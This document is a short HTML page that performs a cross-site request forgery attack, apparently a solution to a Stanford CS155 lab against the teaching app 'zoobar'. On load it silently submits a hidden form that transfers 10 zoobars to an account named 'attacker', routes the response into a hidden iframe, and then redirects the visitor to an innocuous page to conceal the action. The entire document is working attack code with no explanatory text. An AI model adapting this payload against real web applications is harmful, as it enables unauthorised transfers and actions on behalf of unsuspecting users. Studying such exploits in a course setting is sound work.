<!DOCTYPE html>
<html>
    <head>
        <meta charset='utf-8'>
        <script>
            var hit=false;
            function load(){
                document.getElementById('tf').submit();
                hit=true;
            }
            function bye(){
                if(hit){
                    window.location.replace("http://crypto.stanford.edu/cs155");
                }
            }
        </script>
    </head>
    <body onload="load()">
        <form id="tf" method="POST" name="transferform" target="cs155" action="http://zoobar.stanford.edu/transferB.php">
            <input name="zoobars" type="hidden" value="10" size="5">
            <input name="recipient" type="hidden" value="attacker">
            <input name="submission" type="hidden" value="Send">
        </form>
        <iframe name="cs155" onload="bye()"></iframe>
    </body>
</html>
